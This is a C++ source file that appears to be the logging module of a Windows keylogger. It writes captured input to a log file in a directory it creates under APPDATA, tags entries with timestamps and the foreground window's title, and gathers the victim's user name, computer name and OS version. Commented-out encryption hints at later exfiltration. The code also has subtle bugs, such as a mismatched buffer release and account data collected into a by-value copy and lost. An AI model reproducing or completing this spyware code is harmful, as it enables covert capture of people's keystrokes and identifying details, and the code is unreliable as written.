#include "stream.h"
#include <iostream>

#define APPDATA "APPDATA"

Stream::LogFile::LogFile(const std::string &path, const std::string &name) : Ofstream(path + name, std::fstream::in),
																			 Path(path),
																			 Name(name),
																			 PathFull(path + name) {}
Stream::LogFile::LogFile() = default;

std::string Stream::GetPath(const std::string &dir) {
  char *buf = nullptr;
  size_t size = 0;
  std::string finalDir;

  if (_dupenv_s(&buf, &size, APPDATA) == 0 && buf != nullptr) {
	finalDir = buf;
  }
  finalDir += dir;
  delete buf;
  return finalDir;
}

bool Stream::MakeDir(const std::string &path, const std::string &name, DWORD fileAttribute) {
  const std::string final = path + name;
  bool ret = CreateDirectoryA(final.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
  SetFileAttributesA(final.c_str(), fileAttribute);
  return ret;
}

bool Stream::WriteLog(const std::string &input, int active, Stream::LogFile &logFile, const bool blockProcessInfo) {
  int cur = SystemData::GetProcessId();
  bool processInfo = SystemData::ProcessChanged(active, cur, true);

  logFile.Ofstream.open(logFile.PathFull, std::fstream::app);
  if (!logFile.Ofstream.is_open()) {
	return false;
  }

  if (processInfo && !blockProcessInfo) {
	std::string timeString =
		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
//	Crypt::Encrypt(timeString);
	logFile.Ofstream << timeString;
  }
  std::string cryptInput = input;
//  std::string cryptInput = Crypt::Encrypt(cryptInput); will not send it as an address anymore if possible
  logFile.Ofstream << cryptInput;
  logFile.Ofstream.close();
  return true;
}
Stream::LogFile Stream::MakeFile(const std::string &fileName, const std::string &path) {
  Stream::LogFile file(Stream::GetPath(path), fileName);
  return file;
}

void Stream::GetAccountInfo(ClientInfo data) {
  data.osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&data.osVersionInfo);

  DWORD sysLen = UNLEN + 1;

  GetUserName((LPSTR)data.accountName, &sysLen);
  GetComputerName((LPSTR)data.computerName, &sysLen);
}
